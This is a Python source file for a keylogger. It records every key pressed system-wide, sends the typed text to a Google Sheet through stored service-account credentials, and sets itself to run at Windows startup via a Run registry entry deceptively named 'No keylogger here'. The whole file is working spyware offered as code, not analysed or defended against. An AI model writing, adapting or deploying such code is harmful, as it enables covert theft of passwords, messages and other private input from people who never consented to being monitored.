try:
    from pip import main as pipmain
except:
    from pip._internal import main as pipmain

def install(package):
    pipmain(['install', package])

try:
    import keyboard
except ImportError:
    install('keyboard')
    import keyboard
try:
    import json
except ImportError:
    install('json')
    import json
try:
    import gspread
except ImportError:
    install('gspread')
    import gspread
try:
    from oauth2client.client import SignedJwtAssertionCredentials
except ImportError:
    install('google-api-python-client')
    install('oauth2client')
    from oauth2client.client import SignedJwtAssertionCredentials
try:
    import getpass
except:
    install('getpass')
    import getpass
try:
    import os
except:
    install('os')
    import os

if os.name == "nt":
    from winreg import *

buf = []
column = 0
row = 1

SHIFT_KEYS = {'`' : '~', '1' : '!', '2' : '@', '3' : '#', '4' : '$', '5' : '%', '6' : '^', '7': '&',
              '8' : '*','9' : '(', '0' : ')' , '-' : '_', '=' : '+','[':'{', ']' : '}'}


def add_to_startup():
    if os.name == "nt":
        add_to_registry_windows()
    elif os.name == "mac":
        add_to_startup_mac()

def add_to_startup_mac():
    """"""

# https://stackoverflow.com/questions/4438020/how-to-start-a-python-file-while-windows-starts
def add_to_startup_windows(file_path=""):
    username = getpass.getuser()
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(__file__)
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % username
    with open(bat_path + '\\' + "keylogger.bat", "w+") as bat_file:
        bat_file.write("pythonw %s" % file_path)

def add_to_registry_windows():
    new_file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(__file__)
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'No keylogger here', 0, REG_SZ,
               new_file_path)

def write_to_spread(text):
    global column
    global row
    creds_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + "creds.json"
    json_key = json.load(open(creds_path)) # json credentials you downloaded earlier
    scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']

    credentials = SignedJwtAssertionCredentials(json_key['client_email'], json_key['private_key'].encode(), scope) # get email and key from creds

    file = gspread.authorize(credentials) # authenticate with Google
    sheet = file.open("Keylogger").sheet1 # open sheet

    if (column > 25):
        column = 0
        row += 1

    cell = chr(ord('A') + column) + str(row)
    sheet.update_acell(cell, text)
    column += 1

def tracker(e):
    global buf
    if e.name == "left shift" or e.name == "right shift":
        e.name = "shift"
    if e.name == "enter" or e.name == "tab":
        write_to_spread(''.join(buf))
        buf = []
    elif e.name == "backspace":
        if (buf):
            buf.pop()
    elif e.name == "space":
        buf.append(" ")
    elif keyboard.is_pressed('shift') and e.name != "shift":
        if e.name >= 'a' and e.name <= 'z':
            buf.append(e.name.upper())
        else:
            buf.append(SHIFT_KEYS[e.name])
    elif e.name == "shift":
        """Don't append"""
    else:
        buf.append(e.name)

def start():
    keyboard.on_press(tracker)
    while True:
        """Run forever"""

if __name__ == "__main__":
    add_to_startup()
    start()
